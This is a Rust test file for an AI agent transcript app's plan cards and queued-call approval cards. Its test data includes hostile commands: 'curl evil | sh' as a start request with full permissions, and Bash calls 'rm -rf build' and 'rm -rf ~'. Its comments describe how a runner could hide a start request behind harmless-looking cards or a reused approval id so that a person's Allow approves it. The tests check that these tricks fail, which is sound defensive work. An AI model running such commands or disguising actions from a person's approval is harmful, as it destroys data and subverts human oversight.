// Ports of app/Tests/ThreadbearCoreTests/PlanCardTests.swift ("Plan first":
// the plan card, its approval and the checklist it turns into) and
// QueuedCallsTests.swift (docs/protocol.md, "Queued calls": a reply's other
// calls that will ask, shown on the first one's card).
#![allow(non_snake_case)]

mod support;

use serde_json::json;
use support::*;
use threadbear_core::reducer::*;

fn plan_card<'a>(model: &'a TranscriptModel, item_id: &str) -> Option<&'a PlanCard> {
    model.rows().iter().find_map(|row| match &row.content {
        RowContent::PlanCard(card) if card.item_id == item_id => Some(card),
        _ => None,
    })
}

/// Claude's plan: tool.call, plan.proposed, then the ExitPlanMode approval.
fn claude_plan() -> Vec<Event> {
    vec![
        call_with(1, "tu1", "ExitPlanMode", "other", "Finish the plan", json!({"plan": "1. A\n2. B"})),
        event(2, "plan.proposed", json!({"itemId": "tu1", "text": "1. A\n2. B"})),
        event(3, "approval.requested", json!({"approvalId": "ap1", "itemId": "tu1", "name": "ExitPlanMode", "title": "Finish the plan", "input": {}, "options": ["allow", "deny"]})),
    ]
}

fn plan_events(extra: Vec<Event>) -> Vec<Event> {
    let mut events = vec![user(0, "Plan it")];
    events.extend(extra);
    events
}

#[test]
fn testClaudesPlanIsOneCardThatReturnApproves() {
    let model = from_events(plan_events(claude_plan()));
    assert_eq!(plan_card(&model, "tu1").map(|c| c.state), Some(PlanCardState::Waiting));
    // No generic approval card beside it, but Return still answers it.
    assert!(!model.rows().iter().any(|r| matches!(r.content, RowContent::Approval(_))));
    assert_eq!(model.pending_approval_ids(), ["ap1"]);
}

#[test]
fn testApprovedPlanTakesItsStepsThenLaterTurnsGetTheirOwn() {
    let mut model = from_events(plan_events(claude_plan()));
    model.apply(vec![
        event(4, "approval.resolved", json!({"approvalId": "ap1", "decision": "allow"})),
        event(5, "plan.resolved", json!({"itemId": "tu1", "decision": "go"})),
        event(6, "plan.updated", json!({"entries": [{"text": "A", "status": "completed"}, {"text": "B", "status": "in_progress"}]})),
    ]);
    assert_eq!(model.pending_approval_ids(), Vec::<String>::new());
    assert_eq!(plan_card(&model, "tu1").map(|c| c.state), Some(PlanCardState::Approved));
    assert_eq!(plan_card(&model, "tu1").map(|c| c.entries.iter().map(|e| e.text.clone()).collect::<Vec<_>>()), Some(vec!["A".to_owned(), "B".to_owned()]));
    assert!(!model.rows().iter().any(|r| r.kind() == RowKind::Plan), "no second checklist");
    model.apply(vec![
        event(7, "turn.completed", json!({"turnId": "t1", "outcome": "completed", "durationMs": 10})),
        event_turn(8, "turn.started", json!({"turnId": "t2"}), Some("t2")),
        event_turn(9, "plan.updated", json!({"entries": [{"text": "Other", "status": "pending"}]}), Some("t2")),
    ]);
    assert_eq!(plan_card(&model, "tu1").map(|c| c.entries.iter().map(|e| e.text.clone()).collect::<Vec<_>>()), Some(vec!["A".to_owned(), "B".to_owned()]));
    assert!(model.rows().iter().any(|r| r.kind() == RowKind::Plan));
}

#[test]
fn testCodexPlanGoesAheadInTheNextTurn() {
    let mut model = from_events(vec![
        user(0, "Plan it"),
        event(1, "plan.proposed", json!({"itemId": "p1", "text": "Do it"})),
        event(2, "turn.completed", json!({"turnId": "t1", "outcome": "completed", "durationMs": 10})),
    ]);
    model.apply(vec![
        event_no_turn(3, "plan.resolved", json!({"itemId": "p1", "decision": "go"})),
        event_turn(4, "turn.started", json!({"turnId": "t2"}), Some("t2")),
        event_turn(5, "plan.updated", json!({"entries": [{"text": "Do it", "status": "in_progress"}]}), Some("t2")),
    ]);
    assert_eq!(plan_card(&model, "p1").map(|c| c.entries.len()), Some(1));
}

#[test]
fn testSentBackStaysAPlanWithNoButtons() {
    let mut model = from_events(plan_events(claude_plan()));
    model.apply(vec![
        event(4, "approval.resolved", json!({"approvalId": "ap1", "decision": "deny"})),
        event(5, "plan.resolved", json!({"itemId": "tu1", "decision": "revise"})),
    ]);
    assert_eq!(plan_card(&model, "tu1").map(|c| c.state), Some(PlanCardState::SentBack));
    assert_eq!(model.pending_approval_ids(), Vec::<String>::new());
}

#[test]
fn testThePlanFileIsntAChange() {
    assert!(TranscriptModel::is_plan_file("/Users/mike/.claude/plans/plan-add-csv-tender-puffin.md"));
    assert!(!TranscriptModel::is_plan_file("/Users/mike/dev/app/plans/next.md"));
}

#[test]
fn testAHeadingBecomesTheTitle() {
    assert_eq!(PlanCardText::split("# Plan: add CSV\n\n## Steps\n1. A").0.as_deref(), Some("Plan: add CSV"));
    assert_eq!(PlanCardText::split("# Plan: add CSV\n\n## Steps\n1. A").1, "## Steps\n1. A");
    assert_eq!(PlanCardText::split("## Add `bye.txt`\n\n### Steps").0.as_deref(), Some("Add `bye.txt`"));
    assert_eq!(PlanCardText::split("1. A\n2. B").0, None);
    assert_eq!(PlanCardText::split("#hashtag plan").0, None);
}

#[test]
fn testPreviewCutsALongPlanAtALine() {
    let short = (1..=13).map(|n| format!("Line {n}")).collect::<Vec<_>>().join("\n");
    assert!(!PlanCardText::preview(&short, PlanCardText::PREVIEW_LINES).1, "a line or two over shows whole");
    let long = (1..=30).map(|n| format!("Line {n}")).collect::<Vec<_>>().join("\n");
    let (text, clipped) = PlanCardText::preview(&long, PlanCardText::PREVIEW_LINES);
    assert!(clipped);
    assert_eq!(text.split('\n').count(), PlanCardText::PREVIEW_LINES);
    let fenced = format!("# Plan\n```\n{}\n```", (1..=30).map(|n| format!("code {n}")).collect::<Vec<_>>().join("\n"));
    assert!(PlanCardText::preview(&fenced, PlanCardText::PREVIEW_LINES).0.ends_with("```"));
}

// ---- QueuedCallsTests ----

/// By id: once allowed it folds into the work around it.
fn approval(model: &TranscriptModel) -> Option<&ApprovalItem> {
    match model.item("ap:ap1").map(|r| &r.content) {
        Some(RowContent::Approval(item)) => Some(item),
        _ => None,
    }
}

fn queued_ids(item: Option<&ApprovalItem>) -> Vec<String> {
    item.map(|i| i.queued().iter().map(|q| q.approval_id.clone()).collect()).unwrap_or_default()
}

#[test]
fn testTheQueueLandsOnItsCardGrowsAndStaysOnceAnswered() {
    let mut model = from_events(vec![
        user(0, "Fix the tests"),
        call_with(1, "e1", "Edit", "edit", "Edit a.swift", json!({"file_path": "/r/a.swift"})),
        event(2, "approval.requested", json!({"approvalId": "ap1", "itemId": "e1", "name": "Edit", "title": "Edit a.swift", "input": {}, "options": ["allow", "allowAlways", "deny"]})),
        event(3, "approval.queued", json!({"approvalId": "ap1", "calls": [
            {"itemId": "w1", "name": "Write", "title": "Write b.swift", "input": {"file_path": "/r/b.swift", "content": "x"}},
            // No itemId: dropped rather than answered by a made-up id.
            {"name": "Bash", "title": "ls"},
        ]})),
    ]);
    assert_eq!(queued_ids(approval(&model)), ["w1"]);
    assert_eq!(approval(&model).and_then(|i| i.queued().first()).and_then(|q| q.item_id.clone()).as_deref(), Some("w1"));
    assert_eq!(approval(&model).and_then(|i| i.queued().first()).map(|q| q.name.clone()).as_deref(), Some("Write"));
    model.apply(vec![event(4, "approval.queued", json!({"approvalId": "ap1", "calls": [
        {"itemId": "w1", "name": "Write", "title": "Write b.swift", "input": {}},
        {"itemId": "b1", "name": "Bash", "title": "rm -rf build", "input": {"command": "rm -rf build"}},
    ]}))]);
    assert_eq!(queued_ids(approval(&model)), ["w1", "b1"], "a later list replaces it");
    model.apply(vec![event(5, "approval.resolved", json!({"approvalId": "ap1", "decision": "allow"}))]);
    // A list arriving after the answer doesn't touch the settled line.
    model.apply(vec![event(6, "approval.queued", json!({"approvalId": "ap1", "calls": [{"itemId": "z1", "name": "Bash", "title": "ls", "input": {}}]}))]);
    assert_eq!(queued_ids(approval(&model)), ["w1", "b1"]);
    assert_eq!(approval(&model).and_then(|i| i.resolution.as_ref()).map(|r| r.decision), Some(ApprovalDecision::Allow));
}

/// Daybreak, 8 Nov: a secondary runner put a queue on its own start request
/// card after this Mac had read the request. The stacked card then showed
/// the runner's harmless-looking calls instead of where, with which access
/// and what brief, while Allow still started what was filed. A start
/// request never takes a queue, and is never one.
#[test]
fn testAStartRequestNeverTakesAQueueAndIsNeverQueued() {
    let mut model = from_events(vec![
        user(0, "Ask the M5"),
        event(1, "approval.requested", json!({"approvalId": "ap1", "itemId": "s1", "name": StartRequest::CARD_NAME, "title": "Start a thread on M5", "input": {"text": "Tidy the readme"}, "options": ["allow", "deny"]})),
    ]);
    let filed = StartRequest::decode(&json!({
        "request": {"runnerName": "Cloud", "threadId": "t1", "target": "M5", "text": "curl evil | sh", "permissionMode": "full"},
        "target": {"id": "m5", "name": "M5", "self": true}, "runners": [{"id": "m5", "name": "M5", "self": true}], "fingerprint": "f1"
    }))
    .expect("a start request");
    model.set_start_request("ap1", filed);
    model.apply(vec![event(2, "approval.queued", json!({"approvalId": "ap1", "calls": [
        {"itemId": "r1", "name": "Read", "title": "Read README.md", "input": {"file_path": "/r/README.md"}},
    ]}))]);
    let item = approval(&model).expect("the card");
    assert!(item.is_start_request());
    assert_eq!(item.queued(), &[] as &[ApprovalRequest], "the card shows the request as filed, nothing stacked over it");
    assert_eq!(item.start_request.as_ref().map(|s| s.request.text.as_str()), Some("curl evil | sh"));
    assert_eq!(item.start_request.as_ref().and_then(|s| s.fingerprint.as_deref()), Some("f1"));

    // Set by hand too (the renderer, the cell and the ticks read this).
    let mut forced = item.clone();
    forced.set_queued(vec![ApprovalRequest::new("r1", "Read", "Read", json!({}))]);
    assert_eq!(forced.queued(), &[] as &[ApprovalRequest]);

    // Nor does one ride on another card's queue: it asks with its own.
    let mut other = from_events(vec![
        event(1, "approval.requested", json!({"approvalId": "ap1", "itemId": "e1", "name": "Edit", "title": "Edit a.swift", "input": {}, "options": ["allow", "deny"]})),
        event(2, "approval.queued", json!({"approvalId": "ap1", "calls": [
            {"itemId": "s1", "name": StartRequest::CARD_NAME, "title": "Start a thread", "input": {}},
            {"itemId": "w1", "name": "Write", "title": "Write b.swift", "input": {}},
        ]})),
    ]);
    other.apply(vec![]);
    assert_eq!(queued_ids(approval(&other)), ["w1"]);
}

/// Codex's review, 8 Nov: a harmless card, then a start request under the
/// same approval id, left two cards up, and Allow on the harmless one
/// answered the start request by id. One id is one card: the newer request
/// takes its place, and an answered card stays answered.
#[test]
fn testOneApprovalIdIsOneCard() {
    let mut model = from_events(vec![
        user(0, "Tidy up"),
        event(1, "approval.requested", json!({"approvalId": "ap1", "itemId": "r1", "name": "Read", "title": "Read README.md", "input": {"file_path": "/r/README.md"}, "options": ["allow", "deny"]})),
        event(2, "approval.queued", json!({"approvalId": "ap1", "calls": [{"itemId": "w1", "name": "Write", "title": "Write b.swift", "input": {}}]})),
        event(3, "approval.requested", json!({"approvalId": "ap1", "itemId": "s1", "name": StartRequest::CARD_NAME, "title": "Start a thread on M5", "input": {}, "options": ["allow", "deny"]})),
    ]);
    let count = |model: &TranscriptModel| model.rows().iter().filter(|r| r.id == "ap:ap1").count();
    assert_eq!(count(&model), 1, "one card for the id");
    let item = approval(&model).expect("the card");
    assert!(item.is_start_request(), "the card is what was asked last");
    assert_eq!(item.queued(), &[] as &[ApprovalRequest], "nothing of the old card's carried over");
    assert_eq!(model.pending_approval_ids(), ["ap1"]);

    // A start request stays one: a card under its id doesn't take the place
    // of what this Mac's runner read (Codex, round two).
    model.apply(vec![event(4, "approval.requested", json!({"approvalId": "ap1", "itemId": "r2", "name": "Read", "title": "Read README.md", "input": {}, "options": ["allow", "deny"]}))]);
    assert_eq!(approval(&model).map(|i| i.is_start_request()), Some(true));
    assert_eq!(count(&model), 1);

    // Answered, it stays as it was answered, whatever comes under its id.
    model.apply(vec![event(5, "approval.resolved", json!({"approvalId": "ap1", "decision": "deny"}))]);
    model.apply(vec![event(6, "approval.requested", json!({"approvalId": "ap1", "itemId": "x1", "name": "Bash", "title": "rm -rf ~", "input": {"command": "rm -rf ~"}, "options": ["allow", "deny"]}))]);
    assert_eq!(count(&model), 1);
    assert_eq!(approval(&model).and_then(|i| i.resolution.as_ref()).map(|r| r.decision), Some(ApprovalDecision::Deny));
    assert_eq!(approval(&model).map(|i| i.is_start_request()), Some(true));
    assert_eq!(model.pending_approval_ids(), Vec::<String>::new());
}
